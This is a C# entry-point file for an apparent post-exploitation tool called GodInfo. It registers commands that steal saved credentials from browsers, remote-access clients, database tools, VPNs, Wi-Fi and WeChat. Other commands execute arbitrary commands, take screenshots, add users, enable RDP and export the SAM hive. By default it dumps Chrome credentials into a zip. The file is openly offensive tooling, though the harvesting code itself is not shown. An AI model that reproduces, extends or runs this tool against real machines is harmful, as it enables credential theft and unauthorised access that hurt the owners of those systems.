using System;
using System.Diagnostics;
using GodInfo.Commands;
using GodInfo.Utils;

namespace GodInfo
{
    class Program
    {
        static void RegistrationCommands()
        {
            CommandRegistry.RegisterCommand("all", () => new HuntingAllCommand());
            CommandRegistry.RegisterCommand("sys", () => new SystemInfoCommand());
            CommandRegistry.RegisterCommand("pid", () => new ProcessCommand());
            CommandRegistry.RegisterCommand("net", () => new NetworkInfoCommand());
            CommandRegistry.RegisterCommand("rdp", () => new RDPInfoCommand());
            CommandRegistry.RegisterCommand("soft", () => new SoftwareInfoCommand());
            CommandRegistry.RegisterCommand("file", () => new UserFileInfoCommand());
            CommandRegistry.RegisterCommand("domain", () => new DomainInfoCommand());
            CommandRegistry.RegisterCommand("clipboard", () => new ClipboardInfoCommand());
            CommandRegistry.RegisterCommand("iis", () => new IISInfoCommand());
            CommandRegistry.RegisterCommand("history", () => new CommandHistoryInfoCommand());
            CommandRegistry.RegisterCommand("runmru", () => new RunMRUInfoCommand());

            CommandRegistry.RegisterCommand("chrome", () => new ChromiumCredCommand());
            CommandRegistry.RegisterCommand("firefox", () => new FirefoxCredCommand());
            CommandRegistry.RegisterCommand("fshell", () => new FinalShellCredCommand());
            CommandRegistry.RegisterCommand("moba", () => new MobaXtermCredCommand());
            CommandRegistry.RegisterCommand("todesk", () => new ToDeskCredCommand());
            CommandRegistry.RegisterCommand("sunlogin", () => new SunLoginCredCommand());
            CommandRegistry.RegisterCommand("filezilla", () => new FileZillaCredCommand());
            CommandRegistry.RegisterCommand("vpn", () => new VpnCredCommand());
            CommandRegistry.RegisterCommand("wechat", () => new WeChatCredCommand());
            CommandRegistry.RegisterCommand("wifi", () => new WifiCredCommand());
            CommandRegistry.RegisterCommand("winscp", () => new WinSCPCredCommand());
            CommandRegistry.RegisterCommand("heidisql", () => new HeidiSQLCredCommand());
            CommandRegistry.RegisterCommand("dbeaver", () => new DBeaverCredCommand());
            CommandRegistry.RegisterCommand("navicat", () => new NavicatCredCommand());
            CommandRegistry.RegisterCommand("plsql", () => new PLSQLDeveloperCredCommand());
            CommandRegistry.RegisterCommand("sqlyog", () => new SQLyogCredCommand());
            CommandRegistry.RegisterCommand("securecrt", () => new SecureCRTCredCommand());
            CommandRegistry.RegisterCommand("xmanager", () => new XmanagerCredCommand());
            CommandRegistry.RegisterCommand("pinyin", () => new ChinesePinyinCredCommand());
            CommandRegistry.RegisterCommand("teamviewer", () => new TeamViewerCredCommand());
            CommandRegistry.RegisterCommand("netease", () => new NeteaseCloudMusicCredCommand());

            CommandRegistry.RegisterCommand("run", () => new ExecuteCmdCommand());
            CommandRegistry.RegisterCommand("screen", () => new ScreenShotPostCommand());
            CommandRegistry.RegisterCommand("adduser", () => new AddUserCommand());
            CommandRegistry.RegisterCommand("enrdp", () => new EnableRDPCommand());
            CommandRegistry.RegisterCommand("down", () => new DownloadFileCommand());
            CommandRegistry.RegisterCommand("sam", () => new ExportSAMCommand());
        }
        static void Main(string[] args)
        {
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();


            if (args.Length == 0)
            {
                args = new string[] { "chrome", "-zip" };
            }
            
            var commandParsedArgs = CommandLineParser.Parse(args);

            RegistrationCommands();



            try
            {
                var command = CommandRegistry.GetCommand(commandParsedArgs.CommandName);
                string commandName = command.GetType().Name; 
                Logger.Initialize(commandParsedArgs.LogEnabled, commandParsedArgs.ZipEnabled, commandName);
                command.Execute(commandParsedArgs.CommandArgs);
            }
            catch (ArgumentException ex)
            {
                Logger.WriteLine($"\n{ex.Message}");
                CommonUtils.DisplayHelp();
            } catch (Exception ex)
            {
                Logger.WriteLine($"\n{ex.Message}");
            }

            if (commandParsedArgs.LogEnabled)
            {
                Logger.WriteLine("[+] LogFilePath: " + Logger.LogFilePath);
            }

            stopwatch.Stop();
            Logger.WriteLine("\n[*] Hunt End: {0} s", stopwatch.Elapsed.TotalSeconds);

            if (commandParsedArgs.ZipEnabled)
            {
                Logger.SetLogToFile();
            }

        }
    }
}